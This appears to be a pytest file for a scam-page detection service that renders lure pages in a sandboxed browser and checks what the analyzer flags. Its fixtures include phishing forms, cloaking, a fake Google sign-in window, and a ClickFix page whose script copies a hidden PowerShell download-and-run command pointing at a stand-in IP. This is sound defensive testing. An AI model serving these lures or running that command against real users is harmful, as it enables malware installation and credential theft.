"""Tests for the browser sandbox (L6): a real headless Chromium against scam-like test pages
served on this machine, through the egress proxy. Skipped when Playwright or its Chromium
is not installed (pip install playwright && playwright install chromium).
"""

from __future__ import annotations

import asyncio
import hashlib
import sys
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import httpx
import pytest

pytest.importorskip("playwright")
ROOT = Path(__file__).resolve().parents[1]
sys.path[:0] = [str(ROOT / "egress"), str(ROOT / "browser")]
import browser
import egress

APK = b"PK\x03\x04 not a real app" * 50
HTML = {"Content-Type": "text/html; charset=utf-8"}


def page(body: str, title: str = "t") -> bytes:
    return f"<!doctype html><html><head><title>{title}</title></head><body>{body}</body></html>".encode()


PAGES = {
    # The scam appears only after a script runs: L5 sees an empty page.
    "/js-only": (200, HTML, page(
        "<div id=app></div><script>setTimeout(()=>{document.title='Whish Money | Verify';"
        "document.getElementById('app').innerHTML='<h1>Confirm your account</h1><form>"
        "<input name=phone><input name=otp_code autocomplete=one-time-code></form>'},150)</script>")),
    # Redirect built by a script from pieces: L5's pattern cannot read it.
    "/js-redirect": (200, HTML, page("<script>var a='/fi',b='nal';setTimeout(()=>{location[['hr','ef'].join('')]=a+b},100)</script>")),
    "/final": (200, HTML, page("<h1>Sign in</h1><form><input type=password name=p></form>", "Login")),
    # Cloaking: harmless until the visitor touches or scrolls.
    "/cloaked": (200, HTML, page(
        "<p id=x>Welcome to our blog</p><script>const show=()=>{document.getElementById('x').outerHTML="
        "'<form><input name=card_number placeholder=\"Card number\"><input name=cvv></form>'};"
        "['touchstart','mousemove','scroll','click'].forEach(e=>addEventListener(e,show,{once:true}))</script>")),
    # Paste-and-run (ClickFix).
    "/clickfix": (200, HTML, page(
        "<p>Verify you are human: press Windows + R, then Ctrl + V and press Enter</p>"
        "<button id=b style='width:100%;height:700px'>I am not a robot</button><script>"
        "document.getElementById('b').addEventListener('click',()=>navigator.clipboard.writeText("
        "'powershell -w hidden -c \"iex(irm http://203.0.113.9/a)\"'))</script>")),
    # Browser-in-the-browser: a drawn window with a fake address bar around a login.
    "/bitb": (200, HTML, page(
        "<div style='position:fixed;top:60px;left:10px;width:360px;border:1px solid #999;background:#fff'>"
        "<div style='background:#eee'><span>https://accounts.google.com/signin</span></div>"
        "<form><input type=email name=e><input type=password name=p></form></div>")),
    "/plain": (200, HTML, page("<h1>Cedar bakery</h1><p>Opening hours 8 to 6.</p>", "Bakery")),
    "/app.apk": (200, {"Content-Type": "application/vnd.android.package-archive",
                       "Content-Disposition": "attachment; filename=court-file.apk"}, APK),
    "/to-apk": (200, HTML, page("<script>location.href='/app.apk'</script>")),
}


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        status, headers, body = PAGES.get(self.path, (404, {}, b"not found"))
        self.send_response(status)
        for k, v in headers.items():
            self.send_header(k, v)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *args):
        pass


@pytest.fixture(scope="module")
def site():
    server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    yield f"http://127.0.0.1:{server.server_address[1]}", server.server_address[1]
    server.shutdown()


async def start_proxy(policy: egress.Policy):
    server = await egress.serve("127.0.0.1", 0, policy)
    return server, f"http://127.0.0.1:{server.sockets[0].getsockname()[1]}"


async def see(site, path, **policy):
    base, port = site
    policy = policy or {"address_ok": lambda ip: True}
    server, proxy = await start_proxy(egress.Policy(ports=frozenset({port}), **policy))
    async with server:
        out = await browser.render(base + path, proxy, sandbox="off")
    if out.get("stopped") == "browser did not start":
        pytest.skip("Chromium is not installed: " + out.get("message", ""))
    return out


async def test_sees_a_page_that_only_scripts_build(site):
    out = await see(site, "/js-only")
    assert out["stopped"] == "final page" and out["title"] == "Whish Money | Verify"
    assert "Confirm your account" in out["text"] and out["asks_for"] == ["code"]
    assert out["screenshot"].startswith("data:image/jpeg;base64,") and len(out["screenshot"]) < 200_000


async def test_follows_a_redirect_only_a_browser_can(site):
    base, _ = site
    out = await see(site, "/js-redirect")
    assert out["final_url"] == base + "/final" and out["asks_for"] == ["password"]
    assert [h["via"] for h in out["hops"]] == ["script or meta redirect", None]


async def test_cloaked_page_shows_itself_to_a_person(site):
    out = await see(site, "/cloaked")
    assert out["asks_for"] == ["card"] and "Welcome to our blog" not in out["text"]


async def test_paste_and_run_lure(site):
    out = await see(site, "/clickfix")
    assert out["clickfix"] is True and out["clipboard"] and "powershell" in out["clipboard"][0]


async def test_fake_browser_window(site):
    out = await see(site, "/bitb")
    assert out["fake_window"] == ["https://accounts.google.com/signin"] and "password" in out["asks_for"]


async def test_ordinary_page_is_quiet(site):
    out = await see(site, "/plain")
    assert out["stopped"] == "final page" and out["title"] == "Bakery"
    assert not (out["asks_for"] or out["clickfix"] or out["fake_window"] or out["login_frames"] or out["clipboard"])


async def test_download_is_hashed_not_kept(site):
    for path in ("/app.apk", "/to-apk"):
        out = await see(site, path)
        assert out["stopped"] == "file download", path
        assert out["download"]["sha256"] == hashlib.sha256(APK).hexdigest()
        assert out["download"]["filename"] == "court-file.apk"


async def test_private_address_is_blocked(site):
    out = await see(site, "/plain", address_ok=egress.public_address)  # 127.0.0.1 is not public
    assert out["stopped"] == "blocked address" and not out["text"]


async def test_not_a_web_link():
    out = await browser.render("javascript:alert(1)", "http://127.0.0.1:9")
    assert out["ok"] is False and out["stopped"] == "not a web link"


async def test_one_link_per_container(site, tmp_path):
    base, port = site
    proxy_server, proxy = await start_proxy(egress.Policy(ports=frozenset({port}), address_ok=lambda ip: True))
    sock = str(tmp_path / "browser.sock")
    server, worker = await browser.serve(sock, browser.Worker(proxy, jobs_per_life=1, sandbox="off"))
    async with proxy_server, server:
        async with httpx.AsyncClient(transport=httpx.AsyncHTTPTransport(uds=sock), base_url="http://browser",
                                     timeout=60) as c:
            assert (await c.get("/health")).json() == {"status": "ok"}
            first = (await c.post("/render", json={"url": base + "/plain"})).json()
            if first.get("stopped") == "browser did not start":
                pytest.skip("Chromium is not installed")
            assert first["title"] == "Bakery"
            await asyncio.wait_for(worker.done.wait(), 5)  # the worker now asks to be replaced
            second = await c.post("/render", json={"url": base + "/plain"})
            assert second.status_code == 503


# --- end to end: Amaan's analyzer -> L5 worker -> L6 browser, both through the egress proxy ---

async def test_analyzer_adds_what_only_the_browser_sees(site, tmp_path, monkeypatch):
    sys.path.insert(0, str(ROOT / "expander"))
    import expander

    import amaan.analyzer as analyzer_mod
    from amaan.analyzer import Analyzer
    from amaan.clients.browser import BrowserClient
    from amaan.clients.expander import ExpanderClient
    from amaan.config import Settings
    from amaan.schemas import TextRequest, UrlVetResult, UrlVetStatus

    class NoUrlVet:
        async def analyze(self, url):
            return UrlVetResult(status=UrlVetStatus.unavailable, message="off in this test")

    monkeypatch.setattr(analyzer_mod, "local_target", lambda url: False)  # the test site is on 127.0.0.1
    base, port = site
    proxy_server, proxy = await start_proxy(egress.Policy(ports=frozenset({port}), address_ok=lambda ip: True))
    s5, s6 = str(tmp_path / "e.sock"), str(tmp_path / "b.sock")
    l5 = await expander.serve(s5, proxy)
    l6, _ = await browser.serve(s6, browser.Worker(proxy, jobs_per_life=0, sandbox="off"))
    amaan = Analyzer(Settings(_env_file=None), NoUrlVet(), None, ExpanderClient(s5), BrowserClient(s6))
    async with proxy_server, l5, l6:
        hidden = (await amaan.analyze_text(TextRequest(text=f"Verify: {base}/js-only"))).items[0]
        plain = (await amaan.analyze_text(TextRequest(text=f"Menu: {base}/plain"))).items[0]
        lure = (await amaan.analyze_text(TextRequest(text=f"Captcha: {base}/clickfix"))).items[0]
    if hidden.browser is None:
        pytest.skip("Chromium is not installed")
    found = {s.id for s in hidden.signals}
    assert {"page_asks_code", "page_hidden_from_scanners", "page_brand_mismatch"} <= found
    assert hidden.risk_level.value == "High" and hidden.browser.screenshot
    assert hidden.expansion.asks_for == []  # L5 alone saw nothing
    # A raw IP address link is suspicious, so the browser looks too, and finds nothing to add.
    assert not [s for s in plain.signals if s.source == "browser"]
    assert "page_paste_command" in {s.id for s in lure.signals} and lure.risk_level.value == "High"
    assert "clipboard" not in lure.model_dump()["browser"]
